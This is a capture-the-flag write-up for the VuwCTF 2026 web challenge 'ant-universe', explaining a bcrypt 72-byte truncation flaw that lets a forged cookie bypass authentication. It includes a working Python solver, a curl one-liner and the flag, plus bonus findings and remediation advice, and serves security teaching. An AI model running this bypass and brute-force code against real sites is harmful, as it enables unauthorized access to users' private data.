# ant-universe — VuwCTF 2026 (Web)

> *"check out my ant website"*

| | |
|---|---|
| **Event** | VuwCTF 2026 |
| **Category** | Web |
| **Challenge** | ant-universe |
| **Host** | `https://ant-universe-<instance>.challenges.2026.vuwctf.com/` |
| **Stack** | Apache 2.4.68 (Debian) · PHP 8.4.24 · PostgreSQL |
| **Flag** | `VuwCTF{i_wrote_this_before_chapter_5_came_out}` |
| **Bug class** | CWE-916 / bcrypt 72-byte input truncation → authentication bypass |

---

## Table of contents

- [TL;DR](#tldr)
- [1. Recon](#1-recon)
- [2. Source review](#2-source-review)
  - [2.1 `database.php`](#21-databasephp)
  - [2.2 `register.php` — where the hash is built](#22-registerphp--where-the-hash-is-built)
  - [2.3 `login.php` — not actually an authenticator](#23-loginphp--not-actually-an-authenticator)
  - [2.4 `user.php` — the oracle](#24-userphp--the-oracle)
- [3. The vulnerability](#3-the-vulnerability)
  - [3.1 bcrypt's 72-byte ceiling](#31-bcrypts-72-byte-ceiling)
  - [3.2 The secret is last in the buffer](#32-the-secret-is-last-in-the-buffer)
  - [3.3 Picking the target](#33-picking-the-target)
- [4. Local proof of concept](#4-local-proof-of-concept)
- [5. Exploitation](#5-exploitation)
  - [5.1 Cookie encoding](#51-cookie-encoding)
  - [5.2 The boolean oracle](#52-the-boolean-oracle)
  - [5.3 One-liner](#53-one-liner)
  - [5.4 Full exploit](#54-full-exploit)
  - [5.5 Output](#55-output)
- [6. The flag](#6-the-flag)
- [7. Bonus findings](#7-bonus-findings)
- [8. Remediation](#8-remediation)
- [9. Lessons learned](#9-lessons-learned)
- [10. References](#10-references)

---

## TL;DR

`register.php` hashes a **JSON array** rather than the password alone:

```php
password_hash(json_encode([$date, $username, $password]), PASSWORD_BCRYPT)
```

bcrypt only ever reads the **first 72 bytes** of its input. The JSON prefix
`["<26-byte timestamp>","<username>","` consumes that budget, so **the longer the
username, the less of the password bcrypt actually sees.**

User `myrealnamedefisnot_spuukygrrl10311985` has a **37-character** username, which puts the
prefix at exactly **71 bytes** — leaving precisely **one** byte of password inside the hash window.

`user.php` prints a user's `private_blog` whenever `password_verify($_COOKIE["token"], $hash)`
passes, and that cookie is fully attacker-controlled (`login.php` never validates a password —
it just reflects your input back at you). So: forge a 72-byte cookie, brute-force the single
unknown byte (≤96 candidates), read the blog.

**Hit on the 8th guess. No password was ever recovered.**

---

## 1. Recon

Six PHP files ship with the challenge:

```
ant-universe/
├── database.php    # PG connection
├── header.php      # nav bar
├── index.php       # forum index, recursive threaded posts
├── login.php       # "login"
├── register.php    # registration (disabled)
└── user.php        # profile page + private blog
```

The landing page is a late-90s ant forum. Scraping the thread for profile links gives five users:

```bash
curl -s "$TARGET/" | grep -oP '(?<=<a href="user.php\?u=\d">)[^<]*' | sort -u
```

```
b1t3
looker
mant
myrealnamedefisnot_spuukygrrl10311985
realboy5
```

The challenge plants its hint **in-universe**. In the thread, `b1t3` replies:

> **b1t3** — *1999-04-14 18:23:41*
> Hello spuukygirl1031 **that's a very long name you have there!** My favourite pokemon is
> Weedle, it's the closest you can get to an ant hehehe

That is the entire challenge in one sentence. The username length *is* the bug.

Iterating `user.php?u=N` past the five linked accounts reveals **four more users that never
appear in the forum**:

| uid | username | note |
|---|---|---|
| 6 | `!anteater` | not linked from any post |
| 7 | *(renders as "Unknown user")* | see [§7](#7-bonus-findings) |
| 8 | `sssnake` | not linked |
| 9 | `BANNED` | not linked |
| 10 | `ayla_v8` | not linked |

Each profile leaks the account's exact `date_joined` timestamp — which, as we'll see, is
**half of the hash input**.

---

## 2. Source review

### 2.1 `database.php`

```php
$dbconn = pg_connect(
    "host=db dbname=antsantsants user=antmin password=1L0V3MYANT5P455W0RD",
) or die("failed to connect to database: ". pg_last_error());
```

Hardcoded credentials, but the DB is on an internal Docker network — not directly reachable.
Noted and moved on.

### 2.2 `register.php` — where the hash is built

Registration is dead on arrival (line 3 returns `503` before any logic runs), but the file is
still the most important one in the challenge because it documents the **hash format**:

```php
$query = "SELECT localtimestamp FROM users;";
// ... $date = $date[0]["localtimestamp"];

$query = "INSERT INTO users (username, date_joined, password) VALUES ($1, $2, $3);";
pg_query_params($dbconn, $query, [
    $_POST["username"],
    $date,
    password_hash(
        json_encode([$date, $_POST["username"], $_POST["password"]]),   // ← the bug
        PASSWORD_BCRYPT,
    ),
]);
```

Two things to bank:

1. The bcrypt input is `json_encode([date_joined, username, password])` — i.e. the literal string
   `["<date>","<username>","<password>"]`.
2. `date_joined` is stored **verbatim** in a column that `user.php` prints publicly. The first
   third of the hash input is therefore public knowledge.

There is also a length check:

```php
if (mb_strlen($_POST["username"]) > 40) { /* reject */ }
```

`mb_strlen` counts **characters**; bcrypt counts **bytes**. Usernames up to 40 characters are
allowed, and `34 + 40 = 74 > 72` — so the application permits accounts whose password contributes
**nothing at all** to the stored hash. (With multi-byte input the gap is far wider; see [§7](#7-bonus-findings).)

### 2.3 `login.php` — not actually an authenticator

```php
$query = "SELECT * FROM users WHERE username = $1;";
$result = pg_query_params($dbconn, $query, [$_POST["username"]]);
$user   = pg_fetch_all($result, PGSQL_ASSOC);

if ($user) {
    $token = [
        $user[0]["date_joined"],   // from the DB
        $_POST["username"],        // from you
        $_POST["password"],        // from you — never checked!
    ];
    setcookie("token", json_encode($token), time() + 86400, "/", secure: true);
    header("Location: /user.php?u=" . $user[0]["id"]);
}
```

Read that again: **there is no `password_verify` here.** `login.php` does not authenticate
anything. It looks up a username, then hands you back a cookie containing the password *you just
typed*. Any password "works" — you simply get a token that won't verify later.

The practical consequence: the `token` cookie is **100% attacker-controlled**, so `login.php` is
entirely optional. We can craft the cookie by hand and skip this endpoint.

It also doubles as a free oracle for any user's `date_joined`, though `user.php` already prints that.

### 2.4 `user.php` — the oracle

```php
if (isset($_COOKIE["token"])) {
    $query = "SELECT password, private_blog FROM users WHERE id = $1;";
    $result = pg_query_params($dbconn, $query, [$uid]);
    $hash = pg_fetch_all($result, PGSQL_ASSOC);
    if ($hash) {
        $blog = $hash[0]["private_blog"];
        $hash = $hash[0]["password"];
        if (password_verify($_COOKIE["token"], $hash)) {
            echo "<p>" . $blog . "</p>";       // ← the prize
        }
    }
}
```

There is no session concept whatsoever. The cookie is verified against the hash of **whichever
profile you are currently viewing** (`$uid` from `?u=`). The rule is literally:

> *"Present a string that bcrypt-matches user X's stored hash, and you may read user X's private blog."*

All queries use `pg_query_params`, and `$uid` is run through `intval()` — **SQL injection is not
the path here.** (The `// i love sql` comment on the groups query is flavour text.)

```mermaid
sequenceDiagram
    participant A as Attacker
    participant U as user.php
    participant DB as PostgreSQL

    A->>U: GET /user.php?u=3<br/>Cookie: token=<forged 72 bytes>
    U->>DB: SELECT password, private_blog WHERE id=3
    DB-->>U: bcrypt hash + private_blog
    Note over U: password_verify(cookie, hash)<br/>bcrypt compares only first 72 bytes
    U-->>A: 200 + &lt;p&gt;private blog&lt;/p&gt;
```

---

## 3. The vulnerability

### 3.1 bcrypt's 72-byte ceiling

bcrypt derives its key schedule from at most **72 bytes** of input. Everything beyond byte 72 is
discarded. PHP's `password_hash()` / `password_verify()` with `PASSWORD_BCRYPT` raise **no error**
for over-length input (they only reject embedded NUL bytes) — the excess is silently dropped.

That means:

```php
password_verify(substr($x, 0, 72), password_hash($x, PASSWORD_BCRYPT)) === true
```

for *any* `$x`. We confirmed this empirically against the live target — our 72-byte forgery
verified against a hash computed over a demonstrably longer string.

### 3.2 The secret is last in the buffer

Because the app hashes `json_encode([$date, $username, $password])`, the layout is:

```
byte  1                                                                       72
      ┌─┬─┬──────────────────────────┬─┬─┬─┬─────────────────────────────┬─┬─┬─┬──┐
      │[│"│      date_joined         │"│,│"│         username            │"│,│"│??│
      └─┴─┴──────────────────────────┴─┴─┴─┴─────────────────────────────┴─┴─┴─┴──┘
       1 1           26               1 1 1        len(username)          1 1 1  ↑
                                                                                 │
      └──────────────── fixed 34 bytes + len(username) ──────────────────────┘   │
                                                                    first password byte
```

The prefix length is a clean formula:

```
prefix_len          = 2 + 26 + 3 + len(username) + 3
                    = 34 + len(username)

password bytes kept = 72 - prefix_len
                    = 38 - len(username)
```

The attacker knows `date_joined` (printed on the profile) and `username` (printed on the profile),
so **the entire prefix is public**. Only the tail is secret — and the username length controls
how much tail survives.

- `len(username) >= 38` → **0** password bytes hashed → total bypass, zero guessing.
- `len(username) == 37` → **1** password byte hashed → ≤96 guesses.
- `len(username) <= 30` → 8+ bytes → hopeless.

### 3.3 Picking the target

Applying the formula to every discovered account:

| uid | username | chars | prefix (bytes) | password bytes bcrypt sees | feasible? |
|---|---|---:|---:|---:|---|
| **3** | **`myrealnamedefisnot_spuukygrrl10311985`** | **37** | **71** | **1** | ✅ **≤96 guesses** |
| 6 | `!anteater` | 9 | 43 | 29 | ❌ |
| 4 | `realboy5` | 8 | 42 | 30 | ❌ |
| 8 | `sssnake` | 7 | 41 | 31 | ❌ |
| 10 | `ayla_v8` | 7 | 41 | 31 | ❌ |
| 2 | `looker` | 6 | 40 | 32 | ❌ |
| 9 | `BANNED` | 6 | 40 | 32 | ❌ |
| 1 | `b1t3` | 4 | 38 | 34 | ❌ |
| 5 | `mant` | 4 | 38 | 34 | ❌ |

Exactly one account is attackable, and it's the one the forum joked about having a very long name.
37 characters is a deliberate choice by the author: one character shorter than a free bypass, so
you have to actually demonstrate you understand the truncation.

For `u=3`:

```
date_joined = 1999-04-13 23:47:40.126783        (26 chars)
username    = myrealnamedefisnot_spuukygrrl10311985  (37 chars)

prefix      = ["1999-04-13 23:47:40.126783","myrealnamedefisnot_spuukygrrl10311985","
              └───────────────────────── 71 bytes ─────────────────────────────────┘

forgery     = prefix + <1 unknown byte>   →   exactly 72 bytes
```

**Candidate set for byte 72** — it is the first byte of the *JSON-encoded* password, so:

- any printable ASCII character the password starts with, **plus**
- `"` — if the password is the empty string (byte 72 becomes the closing quote), **plus**
- `\` — if the password starts with a character `json_encode` escapes (`"`, `\`, `/`, control chars, …)

That is 95–97 candidates. Trivial.

---

## 4. Local proof of concept

Before touching the target, validate the theory offline. Python's `bcrypt` refuses over-length
input outright (`ValueError: password cannot be longer than 72 bytes`), so truncate manually to
emulate PHP's silent behaviour:

```python
import bcrypt, json

date      = "1999-04-13 23:47:40.126783"
user      = "myrealnamedefisnot_spuukygrrl10311985"
secret_pw = "sup3rl0ng_s3cret_password_nobody_guesses_1031"   # attacker does NOT know this

stored = json.dumps([date, user, secret_pw], separators=(',', ':')).encode()
h      = bcrypt.hashpw(stored[:72], bcrypt.gensalt(rounds=10))   # == PHP's behaviour

prefix = '["%s","%s","' % (date, user)
order  = list("abcdefghijklmnopqrstuvwxyz0123456789"
              "ABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&'()*+,-./:;<=>?@[]^_`{|}~ ") + ['"', '\\']

for i, c in enumerate(order):
    guess = (prefix + c).encode()
    assert len(guess) == 72
    if bcrypt.checkpw(guess, h):
        print("forged token accepted after %d tries: %r" % (i + 1, guess.decode()))
        break
```

```
full hashed input : 118 bytes
bcrypt actually sees: b'["1999-04-13 23:47:40.126783","myrealnamedefisnot_spuukygrrl10311985","s'

prefix            : 71 bytes
password bytes in window: 1

[+] LOCAL PROOF: forged token accepted after 19 tries
    forged token : '["1999-04-13 23:47:40.126783","myrealnamedefisnot_spuukygrrl10311985","s'
    real password: 'sup3rl0ng_s3cret_password_nobody_guesses_1031'  <- never needed
```

A 44-character password, defeated by knowing its first letter. Theory confirmed.

---

## 5. Exploitation

### 5.1 Cookie encoding

PHP **URL-decodes** `$_COOKIE` values automatically (mirroring `setcookie()`, which URL-encodes on
the way out). Our forgery contains `[`, `"`, `,`, and spaces — all of which are illegal or
ambiguous raw in a `Cookie:` header. So percent-encode the whole thing:

```python
cookie = urllib.parse.quote(prefix + c, safe="")
```

Skipping this is the most likely way to get a silently-failing exploit.

### 5.2 The boolean oracle

The profile page is a clean boolean oracle — no timing analysis needed:

| condition | response size |
|---|---|
| verify fails (baseline) | **643 bytes**, 2 × `<p>` |
| verify succeeds | **887 bytes**, 3 × `<p>` |

The baseline page contains exactly two `<p>` tags (`<p>Joined …</p>` and `<p>Groups:</p>`); a
success injects a third. Hence:

```python
def blog_shown(html):
    return html.count("<p>") >= 3 or "VuwCTF{" in html
```

Counting tags rather than comparing byte length keeps the check robust even if the blog were empty
(`<p></p>` still trips it).

### 5.3 One-liner

Once you know the answer is `h`, the whole challenge collapses to a single request — **no login, no
session, no password**:

```bash
curl -s 'https://ant-universe-<instance>.challenges.2026.vuwctf.com/user.php?u=3' \
  -H 'Cookie: token=%5B%221999-04-13%2023%3A47%3A40.126783%22%2C%22myrealnamedefisnot_spuukygrrl10311985%22%2C%22h'
```

Decoded, that cookie is exactly the 72 bytes:

```
["1999-04-13 23:47:40.126783","myrealnamedefisnot_spuukygrrl10311985","h
```

### 5.4 Full exploit

Solver used on the day — enumerates users, ranks them by how much of the password bcrypt can see,
and attacks anything needing ≤1 byte. See [`exploit.py`](exploit.py).

```python
#!/usr/bin/env python3
import re, sys, time, urllib.parse, urllib.request

BASE = "https://ant-universe-<instance>.challenges.2026.vuwctf.com"

def get(path, cookie=None, timeout=30):
    req = urllib.request.Request(BASE + path, headers={"User-Agent": "Mozilla/5.0"})
    if cookie:
        req.add_header("Cookie", "token=" + cookie)   # already percent-encoded
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read().decode("utf-8", "replace")

def get_retry(path, cookie=None, tries=4, pause=2.0):
    for i in range(tries):
        try:
            return get(path, cookie)
        except Exception:
            if i == tries - 1:
                raise
            time.sleep(pause * (i + 1))

def parse_user(html):
    t = re.search(r'<h1 id="user-title">([^<]*)</h1>', html)
    j = re.search(r'<p>Joined ([^<]*)</p>', html)
    return (t.group(1) if t else None), (j.group(1) if j else None)

prefix_for = lambda date, user: '["%s","%s","' % (date, user)
blog_shown = lambda html: html.count("<p>") >= 3 or "VuwCTF{" in html

# 1) enumerate users and score them
users = []
for uid in range(1, 26):
    try:
        html = get_retry("/user.php?u=%d" % uid)
    except Exception:
        continue
    name, joined = parse_user(html)
    if not name or name == "Unknown user" or not joined:
        continue
    plen = len(prefix_for(joined, name).encode())
    users.append((uid, name, joined, plen))
    print("  u=%-3d %-40s prefix=%d bytes -> %d password bytes matter"
          % (uid, name, plen, max(0, 72 - plen)))
    time.sleep(0.3)

users.sort(key=lambda x: -x[3])      # longest prefix = weakest account

# 2) attack, easiest first
order = list("abcdefghijklmnopqrstuvwxyz0123456789"
             "ABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&'()*+,-./:;<=>?@[]^_`{|}~ ") + ['"', '\\']

for uid, name, joined, plen in users:
    prefix = prefix_for(joined, name)
    need   = 72 - plen

    if need <= 0:                                    # password irrelevant entirely
        cookie = urllib.parse.quote(prefix.encode()[:72].decode("utf-8", "replace"), safe="")
        html = get_retry("/user.php?u=%d" % uid, cookie)
        if blog_shown(html):
            print(html); sys.exit(0)
        continue

    if need > 1:
        print("[-] skipping u=%d (%s): needs %d bytes, infeasible" % (uid, name, need))
        continue

    print("[*] attacking u=%d (%s): 1 unknown byte, %d candidates" % (uid, name, len(order)))
    for i, c in enumerate(order):
        guess = prefix + c
        assert len(guess.encode()) == 72
        html = get_retry("/user.php?u=%d" % uid, urllib.parse.quote(guess, safe=""))
        hit  = blog_shown(html)
        print("    [%2d] %-4r len=%d %s" % (i, c, len(html), "<== HIT" if hit else ""))
        if hit:
            print("\n[+] FOUND! byte 72 = %r\n" % c)
            print(html)
            sys.exit(0)
        time.sleep(0.2)
```

> ⚠️ **Be gentle.** `password_verify` is deliberately CPU-expensive, and every request on this
> endpoint triggers one. An early attempt at 15 concurrent threads exhausted the instance's Apache
> workers and wedged it for ~10 minutes (TCP still accepted, HTTP hung indefinitely). Serialize
> your requests — 96 × ~1.8 s ≈ 3 minutes is plenty fast, and it keeps a shared CTF box alive for
> everyone else. *(This bcrypt-as-DoS-amplifier property is itself a finding — see [§7](#7-bonus-findings).)*

### 5.5 Output

```
[*] enumerating users
  u=1   b1t3                                     prefix=38 bytes -> 34 password bytes matter
  u=2   looker                                   prefix=40 bytes -> 32 password bytes matter
  u=3   myrealnamedefisnot_spuukygrrl10311985    prefix=71 bytes ->  1 password bytes matter
  u=4   realboy5                                 prefix=42 bytes -> 30 password bytes matter
  u=5   mant                                     prefix=38 bytes -> 34 password bytes matter
  u=6   !anteater                                prefix=43 bytes -> 29 password bytes matter
  u=8   sssnake                                  prefix=41 bytes -> 31 password bytes matter
  u=9   BANNED                                   prefix=40 bytes -> 32 password bytes matter
  u=10  ayla_v8                                  prefix=41 bytes -> 31 password bytes matter

[*] attacking u=3 (myrealnamedefisnot_spuukygrrl10311985): 1 unknown byte, 95 candidates
    [ 0] 'a'  len=643
    [ 1] 'b'  len=643
    [ 2] 'c'  len=643
    [ 3] 'd'  len=643
    [ 4] 'e'  len=643
    [ 5] 'f'  len=643
    [ 6] 'g'  len=643
    [ 7] 'h'  len=887 <== HIT

[+] FOUND! byte 72 = 'h'
```

Eight requests. The victim's password merely *starts with* `h` — its actual value is still unknown
and always will be, because bcrypt never hashed the rest of it.

---

## 6. The flag

```html
<h1 id="user-title">myrealnamedefisnot_spuukygrrl10311985</h1>
<p>Joined 1999-04-13 23:47:40.126783</p>
<p>Groups:</p>
<ul class="grouplist">
    <li>Veteran Ant Fans<span class="groupowner">(owned by <a href="/user.php?u=1">b1t3</a>)</span></li>
    <li>Cool Cants<span class="groupowner">(owner)</span></li>
</ul>
<p>this is my private blog!<br>
i wonder if it's safe to write that i'm a deer, not an ant and not even a moose...!<br>
well if it's safe to write that it must be safe to write this:
<code>VuwCTF{i_wrote_this_before_chapter_5_came_out}</code></p>
```

```
VuwCTF{i_wrote_this_before_chapter_5_came_out}
```

Which pays off the forum's running gag — `b1t3` opens the board by promising to *"[^permanently ban^]
anyone who is proven to Not Be An Ant"*, and the account with the suspiciously long
`myrealnamedefisnot_…` handle turns out to be a deer.

---

## 7. Bonus findings

Things noticed during review that weren't required for the flag, but are real bugs:

**1 — The token cookie contains the user's plaintext password.**
`json_encode([$date, $username, $password])` is stored client-side and replayed on every request.
Worse, `setcookie()` is called with `secure: true` but **no `httponly`**, so JavaScript can read it.

**2 — Stored XSS everywhere.** No output is escaped. `index.php` prints post bodies and usernames raw:

```php
echo $prefix . "\t<p class=\"post-body\">" . $post["message"] . "</p>\n";
```

`user.php` does the same for the username, group names, and the blog body
(`echo "<h1 id=\"user-title\">$name</h1>"`). Chained with finding #1, a single stored XSS payload
exfiltrates **plaintext credentials** for every user who views the page. Registration being
disabled is the only thing preventing this.

**3 — A user can hide from the site.** [`user.php:42`](user.php#L42) uses a loose comparison:

```php
if ($name == false) { echo "<h1 id=\"user-title\">Unknown user</h1>"; }
```

In PHP, `"0" == false` is `true`. A user literally named `0` renders as "Unknown user" and becomes
invisible. This neatly explains `u=7`, the one gap in the ID sequence.

**4 — The character/byte mismatch makes the truncation bug much worse.**
`register.php` validates with `mb_strlen($username) > 40` (**characters**) while bcrypt truncates
on **bytes**. `json_encode` also escapes non-ASCII to `\uXXXX` by default — 6 bytes per character.
A 40-character username of CJK or emoji produces a prefix of ~240 bytes, meaning the password is
*never hashed at all*. Even in pure ASCII, 38–40 characters is already a full bypass.

**5 — `login.php` performs no authentication.** Worth stating plainly: it is a username-existence
oracle and a cookie vending machine. It never calls `password_verify`.

**6 — bcrypt as a DoS amplifier.** Every `user.php` request carrying a `token` cookie forces a full
bcrypt verification. Unauthenticated, unthrottled, and trivially parallelised — a handful of
concurrent clients will exhaust the worker pool (as I demonstrated by accident).

**7 — Minor:** `error_log("Field missing", 0, "php://stdout")` — message type `0` ignores the
destination argument, so the third parameter does nothing. Hardcoded DB credentials sit in
`database.php`.

---

## 8. Remediation

**Hash the password and nothing else.** The root cause is a variable-length attacker-controlled
field sitting *in front of* the secret in a fixed-size buffer:

```php
// ❌ username length silently controls how much password is hashed
password_hash(json_encode([$date, $username, $password]), PASSWORD_BCRYPT);

// ✅
password_hash($password, PASSWORD_BCRYPT);
```

If you genuinely need to bind extra context (a pepper, a tenant ID), **pre-hash to a fixed length**
so the 72-byte ceiling can never be reached — and put the secret first:

```php
$material = base64_encode(hash_hmac('sha256', $password, $pepper, true)); // always 44 bytes
password_hash($material, PASSWORD_BCRYPT);
```

Or drop bcrypt's ceiling entirely:

```php
password_hash($password, PASSWORD_ARGON2ID);   // no 72-byte limit
```

Also:

- **Real sessions.** Never put a password — plaintext or otherwise — in a cookie. Issue a random
  session ID and keep state server-side.
- **Cookie flags.** `httponly: true`, `samesite: 'Lax'`, alongside the existing `secure: true`.
- **Escape output.** `htmlspecialchars($v, ENT_QUOTES, 'UTF-8')` on every echoed value.
- **Validate in bytes.** Use `strlen()` (or check both) when the downstream consumer is byte-oriented.
- **Rate-limit** endpoints that trigger a KDF, and don't run `password_verify` on unauthenticated requests.
- **Don't leak `date_joined` at full microsecond precision** — it was half the hash input here.

---

## 9. Lessons learned

1. **bcrypt's 72-byte limit is a security boundary, not trivia.** Any scheme that concatenates
   attacker-controlled data ahead of a secret has to prove the secret survives the truncation.
   This is exactly the bug class behind the 2015 Ashley Madison and 2024 Okta AD/LDAP DelAuth
   incidents (Okta: `username + …` exceeding 52 bytes let the password be skipped).
2. **Silent truncation is the dangerous part.** PHP raises nothing; the code looks fine and the
   tests pass. The failure is invisible until someone counts bytes.
3. **Enumerate past what's linked.** Four of nine accounts never appeared in the forum, and the ID
   gap at `u=7` was itself a bug.
4. **Read the flavour text.** *"that's a very long name you have there!"* was the intended nudge,
   sitting in plain sight in the thread.
5. **Attacker-controlled input to `password_verify` means no login is needed.** Once the cookie is
   forgeable, the whole `login.php` flow is decoration.
6. **Throttle yourself against KDF endpoints.** Aggressive parallelism DoS'd the instance and cost
   more wall-clock than the serial run would have.

---

## 10. References

- [Niels Provos & David Mazières — *A Future-Adaptable Password Scheme* (USENIX 1999)](https://www.usenix.org/legacy/events/usenix99/provos.html) — the original bcrypt paper
- [PHP Manual — `password_hash()`](https://www.php.net/manual/en/function.password-hash.php) — *"Using the `PASSWORD_BCRYPT` algorithm will result in the password parameter being truncated to a maximum length of 72 bytes."*
- [PHP Manual — `password_verify()`](https://www.php.net/manual/en/function.password-verify.php)
- [Okta Security Advisory, Oct 2024](https://trust.okta.com/security-advisories/okta-ad-ldap-delegated-authentication-username/) — bcrypt truncation on `userId + username + password`
- [CWE-916: Use of Password Hash With Insufficient Computational Effort](https://cwe.mitre.org/data/definitions/916.html)
- [OWASP Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html#pre-hashing-passwords) — on pre-hashing and the bcrypt input limit

---

<sub>Writeup for VuwCTF 2026 · challenge `ant-universe` · flag `VuwCTF{i_wrote_this_before_chapter_5_came_out}`</sub>
